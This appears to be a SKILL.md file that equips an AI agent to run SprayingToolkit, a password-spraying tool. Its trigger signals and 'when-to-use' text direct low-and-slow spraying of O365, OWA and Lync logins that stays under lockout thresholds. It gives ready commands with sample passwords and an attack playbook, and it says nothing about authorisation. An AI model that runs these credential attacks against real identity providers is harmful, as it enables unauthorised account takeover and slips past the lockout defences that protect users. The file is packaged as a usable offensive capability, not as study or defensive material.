---
name: sprayingtoolkit-idp-spray
description: "SprayingToolkit performs internal IdP password spraying. Signals: brute force, password spraying, O365 spraying, OWA spraying, time-window spray plan generation"
zh-signals: "SprayingToolkit: 内网 IdP 密码喷洒。信号:暴力破解,口令喷射,O365 喷洒,OWA 喷洒,生成时间窗喷洒计划。"
when-to-use: >-
  Use when you have a valid user list and want low-and-slow password spraying
  against internal or cloud IdPs (O365, OWA, Lync) while avoiding lockout thresholds.
---

# SprayingToolkit

- Attack Category: C28 Cloud and Identity Spraying
- Upstream Repository: https://github.com/byt3bl33d3r/SprayingToolkit
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/byt3bl33d3r/SprayingToolkit && cd SprayingToolkit && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python atomizer.py o365 emails.txt 'Winter2024!'` | O365 spraying |
| `python atomizer.py owa https://mail.t.com emails.txt pass.txt` | OWA spraying |
| `python sprayer.py` | Generate a time-window spray plan |
| `--threads 5` | Threads |
| `--output out.txt` | Output |

## Attack Scenario Playbook

### Internal IdP Password Spraying

```bash
python atomizer.py o365 users.txt 'Pass123!' --threads 5
# One attempt per user to stay under account lockout thresholds
```

## Notes

By byt3bl33d3r, automated spraying for O365/OWA/Lync with rate limiting that automatically avoids lockout windows.
